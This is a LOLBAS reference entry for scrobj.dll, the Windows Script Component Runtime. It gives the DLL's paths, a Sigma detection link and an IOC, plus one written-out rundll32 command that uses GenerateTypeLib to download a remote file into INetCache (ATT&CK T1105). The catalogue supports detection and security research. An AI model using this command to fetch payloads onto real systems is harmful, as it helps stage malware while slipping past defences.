---
title: "Scrobj.dll"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Libraries/Scrobj/
fetched_at: 2026-09-20T17:16:18Z
license: unspecified
category: windows
---

Windows Script Component Runtime

## Paths
- c:\windows\system32\scrobj.dll
- c:\windows\syswow64\scrobj.dll

## Resources
- [https://twitter.com/eral4m/status/1479106975967240209](https://twitter.com/eral4m/status/1479106975967240209)

## Acknowledgements
- Eral4m ([@eral4m](https://twitter.com/@eral4m))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)
- IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line

## Download

1. Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.

```
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
```

   - Use case: Download file from remote location.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
